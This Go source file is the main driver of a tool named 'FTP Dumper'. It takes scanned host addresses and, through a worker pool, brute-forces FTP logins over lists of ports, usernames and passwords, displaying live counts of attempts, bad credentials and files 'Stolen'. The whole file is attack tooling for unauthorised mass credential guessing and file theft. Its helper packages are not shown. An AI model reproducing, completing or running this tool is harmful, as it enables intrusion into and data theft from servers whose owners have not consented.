package main

import (
	"FTPDumper/Core"
	"FTPDumper/Dumper"
	"errors"
	"fmt"
	"time"
)

func main() {
	fmt.Println("Starting FTP Dumper...")

	if Core.Verbose {
		fmt.Println("Setting up reader")
	}
	reader := Core.NewReader(Core.Scanner, Core.Type)

	if Core.Verbose {
		fmt.Println("Setting up pool")
	}
	pool := Core.New(Core.Limit)
	pool.Start()
	defer pool.Stop()

	if Core.Verbose {
		fmt.Printf("Limit: %d\n", Core.Limit)
		fmt.Printf("Output Folder: %s\n", Core.OutputFolder)
		fmt.Printf("Scanner: %s\n", Core.Scanner)
	}

	go func() {
		for {
			fmt.Printf("\033[33mAttemp: [%d] \033[97m|\033[32m Success: [%d] \033[97m|\033[91m BadCred: [%d] \033[97m|\u001B[96m Stolen: [%d]\n", Core.Counter.Get("Total"), Core.Counter.Get("Success"), Core.Counter.Get("BadCred"), Core.Counter.Get("Stolen"))
			time.Sleep(time.Second)
		}
	}()

	for address, err := reader.Next(); address != "" && err == nil; address, err = reader.Next() {
		pool.Submit(func() {
			for _, port := range Core.Ports {
				for _, user := range Core.Users {
					for _, password := range Core.Passwords {
						err := Dumper.Try(address, port, user, password)
						if errors.Is(err, Core.TimeoutErr) {
							return
						}
						if errors.Is(err, Core.BadCredErr) {
							Core.Counter.Increment("BadCred")
						}

						if err == nil {
							return
						}
					}
				}
			}
		})
	}
}
